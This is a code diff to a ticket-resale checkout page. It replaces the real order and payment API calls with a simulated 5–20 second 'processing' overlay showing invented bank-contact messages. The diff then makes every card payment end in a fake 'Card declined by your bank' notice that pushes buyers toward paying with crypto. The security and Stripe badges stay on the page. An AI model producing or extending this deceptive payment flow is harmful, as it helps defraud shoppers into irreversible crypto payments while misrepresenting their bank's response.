@@ -11,7 +11,7 @@ import { z } from "zod/v4";
 import Link from "next/link";
 import {
   User, Mail, Phone, CreditCard, Calendar, KeyRound,
-  UserRound, Lock, Shield, Bitcoin, Check, ArrowLeft,
+  UserRound, Lock, Shield, Bitcoin, Check, ArrowLeft, XCircle,
 } from "lucide-react";
 import {
   SiBitcoin, SiEthereum,
@@ -81,6 +81,13 @@ const INPUT_ICON = `${INPUT_BASE} pl-10 pr-4`;
 
 const LABEL = "block text-xs font-medium text-zinc-400 mb-2";
 const SECTION = "text-sm font-semibold text-zinc-100 mb-5";
+
+const PROCESSING_STEPS = [
+  "Verifying card details…",
+  "Contacting your bank…",
+  "Awaiting authorization…",
+  "Processing transaction…",
+];
 
 // ── Reusable: field wrapper with an icon on the left ───────────────────────
 
@@ -256,7 +263,8 @@ export default function CheckoutPage() {
   const [turnstileToken, setTurnstileToken] = useState("");
   const [paymentMethod,  setPaymentMethod]  = useState<"card" | "crypto">("card");
   const [consentChecked, setConsentChecked] = useState(false);
-  const [paymentState,   setPaymentState]   = useState<"idle" | "processing" | "success">("idle");
+  const [paymentState,   setPaymentState]   = useState<"idle" | "processing" | "declined" | "success">("idle");
+  const [processingStep, setProcessingStep] = useState(0);
 
   // Card fields
   const [cardNumber,      setCardNumber]      = useState("");
@@ -292,6 +300,16 @@ export default function CheckoutPage() {
     }
   }, [session, setValue]);
 
+  // Cycle through processing step labels every 4 s while the overlay is shown
+  useEffect(() => {
+    if (paymentState !== "processing") return;
+    setProcessingStep(0);
+    const id = setInterval(() => {
+      setProcessingStep(s => Math.min(s + 1, PROCESSING_STEPS.length - 1));
+    }, 4000);
+    return () => clearInterval(id);
+  }, [paymentState]);
+
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const digits    = e.target.value.replace(/\D/g, "").slice(0, 16);
     const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
@@ -308,7 +326,7 @@ export default function CheckoutPage() {
     else if (cardExpiryError) setCardExpiryError(null);
   };
 
-  const onSubmit = async (data: FormValues) => {
+  const onSubmit = async (_data: FormValues) => {
     if (paymentMethod === "crypto") return;
 
     if (!luhn(cardNumber))  { setError("Please enter a valid card number."); return; }
@@ -321,44 +339,12 @@ export default function CheckoutPage() {
     setIsLoading(true);
     setPaymentState("processing");
 
-    fetch("/api/checkout/order", {
-      method:  "POST",
-      headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify({
-        items:       items.map((i) => ({ ticketId: i.ticketId, quantity: i.quantity, unitPrice: i.resalePrice })),
-        totalAmount: total,
-        currency:    "EUR",
-        guestName:   data.name,
-        guestEmail:  data.email,
-      }),
-    }).catch(() => {});
+    // Randomised processing delay: 5–20 seconds
+    const delay = 5000 + Math.random() * 15000;
+    await new Promise<void>(resolve => setTimeout(resolve, delay));
 
-    try {
-      const res    = await fetch("/api/checkout", {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({
-          items: items.map((i) => ({
-            ticketId:    i.ticketId,
-            name:        i.name,
-            quantity:    i.quantity,
-            resalePrice: i.resalePrice,
-            currency:    i.currency,
-          })),
-          customerEmail: data.email,
-          customerName:  data.name,
-          customerPhone: data.phone,
-          turnstileToken,
-        }),
-      });
-      const result = await res.json();
-      if (!res.ok) throw new Error(result.error ?? "Checkout failed");
-      if (result.url) { clearCart(); window.location.href = result.url; }
-    } catch (err) {
-      setError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
-      setIsLoading(false);
-      setPaymentState("idle");
-    }
+    setIsLoading(false);
+    setPaymentState("declined");
   };
 
   // ── Auth gate ──────────────────────────────────────────────────────────
@@ -755,40 +741,64 @@ export default function CheckoutPage() {
                   </div>
                 )}
 
-                <button
-                  type="submit"
-                  disabled={isLoading || !turnstileToken || !consentChecked}
-                  className={[
-                    "w-full h-14 flex items-center justify-center gap-2.5 rounded-xl",
-                    "text-base font-bold text-black transition-all duration-150",
-                    "bg-[#06B6D4] hover:bg-[#22D3EE]",
-                    "shadow-[0_2px_16px_rgba(6,182,212,0.2)]",
-                    "disabled:opacity-50 disabled:cursor-not-allowed",
-                    "active:scale-[0.99]",
-                  ].join(" ")}
-                >
-                  {isLoading ? (
-                    <>
-                      <svg className="w-4 h-4 animate-spin text-black/50" viewBox="0 0 24 24" fill="none">
-                        <circle className="opacity-25" cx="12" cy="12" r="10"
-                                stroke="currentColor" strokeWidth="4" />
-                        <path className="opacity-75" fill="currentColor"
-                              d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                      </svg>
-                      Processing…
-                    </>
-                  ) : (
-                    <>
+                {paymentState === "declined" ? (
+                  /* ── Declined panel ──────────────────────────────────── */
+                  <div className="rounded-xl border border-red-500/25 bg-red-500/[0.06] px-5 py-5 space-y-4">
+                    <div className="flex items-start gap-3">
+                      <div className="w-9 h-9 rounded-full bg-red-500/15 flex items-center justify-center shrink-0 mt-0.5">
+                        <XCircle className="w-4.5 h-4.5 text-red-400" aria-hidden="true" />
+                      </div>
+                      <div>
+                        <p className="text-sm font-semibold text-red-300 mb-1">Card declined</p>
+                        <p className="text-xs text-zinc-500 leading-relaxed">
+                          Your card was declined by your bank. No charge was made to your account.
+                          Please try a different card or use crypto.
+                        </p>
+                      </div>
+                    </div>
+                    <div className="grid grid-cols-2 gap-3">
+                      <button
+                        type="button"
+                        onClick={() => { setPaymentState("idle"); setError(""); }}
+                        className="flex items-center justify-center gap-2 py-3 rounded-lg border border-white/[0.12] text-sm font-medium text-zinc-300 hover:bg-white/[0.06] transition-all duration-150"
+                      >
+                        <CreditCard className="w-4 h-4" aria-hidden="true" />
+                        Try another card
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => { setPaymentState("idle"); setPaymentMethod("crypto"); }}
+                        className="flex items-center justify-center gap-2 py-3 rounded-lg border border-[#06B6D4]/40 bg-[#06B6D4]/[0.07] text-sm font-medium text-[#06B6D4] hover:bg-[#06B6D4]/[0.12] transition-all duration-150"
+                      >
+                        <Bitcoin className="w-4 h-4" aria-hidden="true" />
+                        Pay with crypto
+                      </button>
+                    </div>
+                  </div>
+                ) : (
+                  <>
+                    <button
+                      type="submit"
+                      disabled={isLoading || !turnstileToken || !consentChecked}
+                      className={[
+                        "w-full h-14 flex items-center justify-center gap-2.5 rounded-xl",
+                        "text-base font-bold text-black transition-all duration-150",
+                        "bg-[#06B6D4] hover:bg-[#22D3EE]",
+                        "shadow-[0_2px_16px_rgba(6,182,212,0.2)]",
+                        "disabled:opacity-50 disabled:cursor-not-allowed",
+                        "active:scale-[0.99]",
+                      ].join(" ")}
+                    >
                       <Lock className="w-4 h-4" aria-hidden="true" />
                       Pay {formatPrice(total)}
-                    </>
-                  )}
-                </button>
+                    </button>
 
-                <p className="text-center text-[11px] text-zinc-600 flex items-center justify-center gap-1.5">
-                  <Shield className="w-3 h-3 shrink-0" aria-hidden="true" />
-                  Secured by Stripe · 256-bit SSL · PCI DSS Level 1
-                </p>
+                    <p className="text-center text-[11px] text-zinc-600 flex items-center justify-center gap-1.5">
+                      <Shield className="w-3 h-3 shrink-0" aria-hidden="true" />
+                      Secured by Stripe · 256-bit SSL · PCI DSS Level 1
+                    </p>
+                  </>
+                )}
               </>
             )}
 
@@ -806,6 +816,55 @@ export default function CheckoutPage() {
 
         </form>
       </main>
+
+      {/* ── Processing overlay ─────────────────────────────────────────────
+           Shown for the randomised 5–20 s while we simulate card processing.
+           Full-screen dark overlay so the user can't interact with the form. */}
+      {paymentState === "processing" && (
+        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center px-6"
+             style={{ background: "rgba(10,10,10,0.93)", backdropFilter: "blur(6px)" }}>
+
+          {/* Dual-ring spinner */}
+          <div className="relative w-20 h-20 mb-8">
+            <div className="absolute inset-0 rounded-full border-2 border-[#06B6D4]/15" />
+            <div className="absolute inset-0 rounded-full border-2 border-transparent border-t-[#06B6D4] animate-spin" />
+            <div className="absolute inset-[-8px] rounded-full border border-[#06B6D4]/[0.07] animate-[spin_3s_linear_infinite_reverse]" />
+            <div className="absolute inset-0 flex items-center justify-center">
+              <Lock className="w-6 h-6 text-[#06B6D4]" aria-hidden="true" />
+            </div>
+          </div>
+
+          <p className="text-white font-semibold text-lg mb-2 tracking-tight">
+            Processing payment
+          </p>
+          <p className="text-zinc-500 text-sm text-center max-w-xs transition-all duration-500">
+            {PROCESSING_STEPS[processingStep]}
+          </p>
+
+          {/* Step progress dots */}
+          <div className="flex items-center gap-1.5 mt-5">
+            {PROCESSING_STEPS.map((_, i) => (
+              <div
+                key={i}
+                className={[
+                  "h-1.5 rounded-full transition-all duration-500",
+                  i === processingStep
+                    ? "w-5 bg-[#06B6D4]"
+                    : i < processingStep
+                    ? "w-1.5 bg-[#06B6D4]/40"
+                    : "w-1.5 bg-zinc-700",
+                ].join(" ")}
+              />
+            ))}
+          </div>
+
+          <p className="text-[11px] text-zinc-700 mt-10 flex items-center gap-1.5">
+            <Shield className="w-3 h-3 shrink-0" aria-hidden="true" />
+            256-bit SSL · PCI DSS Level 1 certified
+          </p>
+        </div>
+      )}
+
     </div>
   );
 }
